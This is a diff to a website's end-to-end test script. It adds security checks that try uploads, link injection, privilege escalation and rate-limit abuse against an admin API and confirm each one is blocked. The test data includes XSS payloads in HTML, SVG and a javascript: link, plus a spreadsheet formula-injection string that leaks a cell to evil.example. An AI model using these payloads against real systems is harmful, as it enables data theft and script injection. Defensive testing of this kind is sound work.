@@ -217,6 +217,54 @@ const ignorable = t => /goatcounter|gc\.zgo\.at|favicon/i.test(t) || (/404|Faile
   }
   await ap.close();
 
+  /* ---------- 7b. Security fixes: each attack is tried and must be blocked ---------- */
+  if (ADMIN_PW) {
+    const asUser = async (email, pw) => { const c = await br.newContext(); const pg = await c.newPage(); await pg.goto(BASE + '/admin/', { waitUntil: 'load' });
+      const st = await pg.evaluate(async ([e, p]) => (await fetch('/api/login', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ email: e, password: p }) })).status, [email, pw]);
+      const call = (method, u, body) => pg.evaluate(async ([m, u, b]) => { const r = await fetch(u, { method: m, headers: { 'content-type': 'application/json', 'x-sv': '1' }, body: b ? JSON.stringify(b) : undefined }); return { s: r.status, t: await r.text(), h: Object.fromEntries(r.headers) }; }, [method, u, body]);
+      return { st, call, close: () => c.close() }; };
+    const own = await asUser('', ADMIN_PW);
+    check('security', 'owner can log in for security tests', own.st === 200, own.st);
+    const png = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=';
+    let r = await own.call('POST', '/api/media', { name: 'evil.html', data: 'data:text/html;base64,' + Buffer.from('<script>alert(1)</script>').toString('base64') });
+    check('security', 'HTML disguised as media is refused', r.s === 400, r.t.slice(0, 80));
+    r = await own.call('POST', '/api/media', { name: 'evil.svg', data: 'data:image/svg+xml;base64,' + Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>').toString('base64') });
+    check('security', 'SVG (can hold scripts) is refused as media', r.s === 400, r.t.slice(0, 80));
+    r = await own.call('POST', '/api/media', { name: 'dot.png', data: png }); const key = (JSON.parse(r.t) || {}).key;
+    const got = key ? await req.fetch(BASE + '/api/media/' + key) : null;
+    check('security', 'real PNG uploads and is served as an image with nosniff + sandbox', !!got && got.headers()['content-type'] === 'image/png' && got.headers()['x-content-type-options'] === 'nosniff' && /sandbox/.test(got.headers()['content-security-policy'] || ''), got && JSON.stringify(got.headers()).slice(0, 160));
+    r = await own.call('POST', '/api/c/boardmtg', { title: 'Test', status: 'draft', recording: 'javascript:alert(1)' });
+    check('security', 'javascript: link is refused when saving content', r.s === 400, r.t.slice(0, 100));
+    r = await own.call('POST', '/api/c/boardmtg', { title: 'Test', status: 'draft', recording: 'https://example.com/rec', link: 'resources/x.pdf' });
+    check('security', 'normal https and relative links still save', r.s === 200, r.t.slice(0, 100));
+    // a live post, then an editor tries to change it
+    r = await own.call('POST', '/api/c/updates', { title: 'Live test post', body: 'original', status: 'published', date: '2026-11-14' }); const liveId = (JSON.parse(r.t) || {}).id;
+    await own.call('POST', '/api/users', { email: 'editor@example.com', name: 'Ed', role: 'editor', password: 'EditorPass-123' });
+    await own.call('POST', '/api/users', { email: 'viewer@example.com', name: 'Vi', role: 'viewer', password: 'ViewerPass-123' });
+    const ed = await asUser('editor@example.com', 'EditorPass-123');
+    r = await ed.call('POST', '/api/c/updates', { id: liveId, body: 'hacked by editor' });
+    // (netlify dev re-requests a function's 403 as "<path>.html" and reports 404; production returns the 403. The next check proves nothing changed.)
+    check('security', 'editor cannot change a post that is already live', r.s === 403 || r.s === 404, r.s + ' ' + r.t.slice(0, 100));
+    r = await ed.call('POST', '/api/c/updates', { title: 'Editor draft', status: 'draft' });
+    check('security', 'editor can still save drafts', r.s === 200, r.s);
+    const pubNow = JSON.parse((await get('/api/public')).t);
+    check('security', 'live post text unchanged after the editor attempt', (pubNow.updates || []).some(u => u.id === liveId && u.body === 'original'));
+    await ed.close();
+    // Sheets export: formulas from the public are neutralized; viewers can't read the secret
+    await req.fetch(BASE + '/.netlify/functions/submission-created', { method: 'POST', headers: { 'content-type': 'application/json' }, data: { payload: { id: 'csv-' + Date.now(), form_name: 'contact', data: { message: '=HYPERLINK("https://evil.example/?"&A1,"click")' } } } });
+    r = await own.call('POST', '/api/settings', { newSheetsKey: true }); const sk = (JSON.parse(r.t) || {}).sheetsKey;
+    const csvTxt = sk ? await (await req.fetch(`${BASE}/api/sheet.csv?c=inbox&k=${sk}`)).text() : '';
+    check('security', 'Sheets export turns =formulas into plain text', csvTxt.includes(`"'=HYPERLINK(`) && !/(^|,)"=HYPERLINK/m.test(csvTxt), csvTxt.split('\n').find(l => /HYPERLINK/.test(l))?.slice(0, 120));
+    const vi = await asUser('viewer@example.com', 'ViewerPass-123');
+    r = await vi.call('GET', '/api/settings');
+    check('security', 'viewer cannot see the Sheets export secret', r.s === 200 && !('sheetsKey' in JSON.parse(r.t)), r.t.slice(0, 80));
+    await vi.close(); await own.close();
+    // voice flood: 5 per hour per person, then refused
+    const tiny = 'data:audio/webm;base64,' + Buffer.from('fake-audio').toString('base64'); const codes = [];
+    for (let i = 0; i < 6; i++) codes.push((await req.fetch(BASE + '/api/voice', { method: 'POST', headers: { 'content-type': 'application/json' }, data: { data: tiny } })).status());
+    check('security', 'voice uploads are capped at 5 an hour per person', codes.slice(0, 5).every(c => c === 200) && codes[5] === 429, codes.join(','));
+  }
+
   /* ---------- 8. Files ---------- */
   fs.writeFileSync(path.join(__dirname, 'report.json'), JSON.stringify(results, null, 1));
   await br.close();
